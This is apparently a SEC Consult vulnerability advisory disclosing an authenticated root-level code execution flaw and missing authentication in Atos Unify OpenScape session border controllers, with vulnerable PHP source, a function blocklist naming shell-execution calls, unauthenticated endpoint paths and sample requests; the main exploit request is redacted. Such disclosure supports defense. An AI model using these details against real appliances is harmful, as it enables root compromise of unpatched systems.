Armin Weihbold (Office Linz) | SEC Consult Vulnerability Lab

Two vulnerabilities have been identified in the Atos Unify OpenScape products Session Border Controller, Branch, and BCF. The first one allows a low-privileged attacker to execute arbitrary operating systems commands as root user. The second allows an unauthenticated attacker to access and execute various configuration scripts.

## Vendor description

*"Unify is the Atos brand for communication and collaboration solutions Unify is the newest member of the Atos family, combining Atos’ knowledge and reputation in the IT services market with Unify’s expertise in unified communications and collaboration to provide customers with seamless services solutions for their entire digital portfolio. Within Atos, Unify continues to deliver a unique integrated proposition for unified communications and real time capabilities."*

## Business recommendation

SEC Consult recommends users of the affected products to install the latest update.

Furthermore, an in-depth security analysis performed by security professionals is highly advised, as the software may be affected from other security issues.

## Vulnerability overview/description

### 1) Authenticated Remote Code Execution (CVE-2023-36618)

The API of the administrative web application insufficiently validates the input of authenticated users at the server. This leads to the possibility of executing arbitrary PHP functions (with some defined exceptions) and subsequently operating system level commands with root privileges. A low-privileged ReadOnly role is sufficient to exploit this security issue.

### 2) Missing Authentication (CVE-2023-36619)

A number of scripts that are used to administer the appliance can be accessed or executed unauthenticated via the web server.

## Proof of concept

### 1) Authenticated Remote Code Execution (CVE-2023-36618)

A large part of the application is built according to the scheme in the following listing. Some functions are defined and at the end the function `callMainFunction`is called, which takes care of processing POST data.

```
<?php
    require_once '../core/CoreAPI.php';

    function tempSessionAcdQueue($args = null)
    {
        [...SNIP...]
    }

    function getAcdQueueInfo($args = null) {
        [...SNIP...]
    }

    // calls function which will handle the Post requests
    callMainFunction();
```

`callMainFunction` in `/srv/www/htdocs/core/CoreAPI.php` essentially calls arbitrary functions with arbitrary arguments passed via POST parameters, and only tests beforehand whether or not they are in a list of forbidden functions (`cfgUtilCheckMethod`) and whether the user is authenticated:

```
    <?php
[...]
    require_once 'cfgUtil.php';
[...]

    function callMainFunction () {

        $func = ( isset($_POST['method']) ) ? trim(cfgUtilGetPostData('method')) : null ;
        if (cfgUtilCheckMethod($func)) return;
        $args = ( isset($_POST['args']) ) ? cfgUtilSanitizePostArgs(json_decode($_POST['args'], true)) : null ;
[...]

        if ( function_exists($func) && is_callable($func) ) {
            @session_start();
            if (!isset($_SESSION["Authenticated"]) || ($_SESSION["Authenticated"] == false)) {
                session_destroy();
[...]
            } else {
                if ( $args != null ) $func($args);
                else $func();
            }
        }
    }
```

Then `cfgUtilCheckMethod` in `/srv/www/htdocs/core/cfgUtil.php` checks for a number of dangerous functions which should get blocked:

```
function cfgUtilCheckMethod($func)
{
    if (isset($func)) {
        // block methods
        $methods = array(
[...]
            “eval”,
            “exec”,
[...]
            “shell_exec”,
[...]
            “system”,
        );
        if (in_array($func, $methods)) return 1;
    }
    return 0;
}
```

What has been forgotten here are the functions provided by cfgUtil.php itself like `cfgUtilExecute`, `cfgUtilShellExec` and especially `cfgUtilShellExecSudo`, `cfgUtilSetPermExecSudo` and `cfgUtilExecSudo`.

These functions allow an authenticated attacker (a ReadOnly role is sufficient for this) to execute arbitrary commands as root user on the appliance.

```
function cfgUtilShellExecSudo( $command, $escape = TRUE, $supressLog = FALSE )
{
    $newcommand=$command;
    if ( $escape == TRUE ) $newcommand = escapeshellcmd($command);
    if ( ($newcommand != $command) and ($supressLog != TRUE ) )
        osb_log(E_WARNING, debug_backtrace()[1][‘function’]. “(): The command: “ . $command . “ is not equivalent to: “ . $newcommand);
    $retvalue = trim(shell_exec(‘/usr/bin/sudo ‘ . $newcommand ));
    return $retvalue;
}

```

To demonstrate the RCE vulnerability, it is sufficient to send a request like the following to any endpoint that calls `callMainFunction` like in:

`[PoC URL removed]`

```
[PoC POST request removed]
```

The server response indicates a successful request:

```
HTTP/1.1 200 OK
Date: Fri, 21 Apr 2023 10:22:42 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: 0
Cache-Control: max-age=0, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

If we now list the contents of the `/tmp` directory on the server, we see that the file `root\_from\_ro` was created by the root user:

```
user@server:/tmp> ls -al
[...]
-rw-r--r--  1 root        root           0 Apr 21 10:22 root_from_ro
```
### 2) Missing Authentication (CVE-2023-36619)

The following scripts, which are executable without authentication and do not expect command line arguments, could be identified. For this, heuristic methods based on the source code were used. In particular, scripts were searched that do not use any of the normally used authentication methods and do not only consist of classes.

* [hostname/core/configuringInBackground.php](https://hostname/core/configuringInBackground.php)
* [hostname/core/downloadProfiles.php](https://hostname/core/downloadProfiles.php)
* [hostname/core/hello\_world.php](https://hostname/core/hello_world.php)
* [hostname/core/scripts/applyZooServerData.php](https://hostname/core/scripts/applyZooServerData.php)
* [hostname/core/scripts/cfgGenUpdateSSPStatusTable.php](https://hostname/core/scripts/cfgGenUpdateSSPStatusTable.php)
* [hostname/core/scripts/checkcardsDbHw.php](https://hostname/core/scripts/checkcardsDbHw.php)
* [hostname/core/scripts/config1.php](https://hostname/core/scripts/config1.php)
* [hostname/core/scripts/recover.php](https://hostname/core/scripts/recover.php)
* [hostname/core/scripts/start.php](https://hostname/core/scripts/start.php)
* [hostname/core/scripts/startPre.php](https://hostname/core/scripts/startPre.php)
* [hostname/core/shutdown.php&nbsp](https://hostname/core/shutdown.php%26nbsp);
* [hostname/data/sipLbInfo.php](https://hostname/data/sipLbInfo.php)
* [hostname/data/turnInfo.php](https://hostname/data/turnInfo.php)

The following demonstrates an execution. The following request is sent to the appliance:

```
GET /core/scripts/start.php HTTP/1.1
Host: hostname
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https:// hostname/acd.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

In the successful response, the time is highlighted to compare with the PHP log:

```
HTTP/1.1 200 OK
Date: Thu, 20 Apr 2023 11:47:34 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

In the PHP log you will now find the following output, which shows that this script is used for configuring and starting the appliance and was actually executed:
